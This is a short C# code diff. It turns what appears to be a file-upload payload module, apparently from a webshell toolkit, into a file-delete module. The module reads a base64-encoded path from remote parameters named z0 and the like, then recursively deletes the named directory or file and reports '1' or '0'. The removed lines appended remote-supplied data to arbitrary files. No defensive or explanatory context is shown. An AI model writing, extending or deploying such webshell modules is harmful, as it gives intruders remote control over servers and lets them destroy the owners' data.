@@ -8,7 +8,7 @@ using System.Runtime.InteropServices;
 using System.Reflection;
 using System.Threading;
 
-public class file_upload
+public class file_delete
 {
     private Dictionary<string, string> fnParseParams(string szParam)
     {
@@ -63,22 +63,24 @@ public class file_upload
             StringBuilder sb = new StringBuilder();
 
             string szPath = fnB64Decode(dic["z0"]);
-            string szChunkSize = fnB64Decode(dic["z1"]);
-            string szChunkData = fnB64Decode(dic["z2"]);
-
-            szChunkData = szChunkData.Replace("\r", "").Replace("\n", "");
-
             try
             {
-                byte[] abBuffer = Convert.FromBase64String(szChunkData);
-                using (FileStream fs = new FileStream(szPath, FileMode.Append, FileAccess.Write))
+                if (Directory.Exists(szPath))
                 {
-                    fs.Write(abBuffer, 0, abBuffer.Length);
+                    Directory.Delete(szPath, true);
+                    sb.Append("1");
                 }
-
-                sb.Append("1");
+                else if (File.Exists(szPath))
+                {
+                    File.Delete(szPath);
+                    sb.Append("1");
+                }
+                else
+                {
+                    sb.Append("0");
+                }
             }
-            catch (Exception ex)
+            catch
             {
                 sb.Append("0");
             }
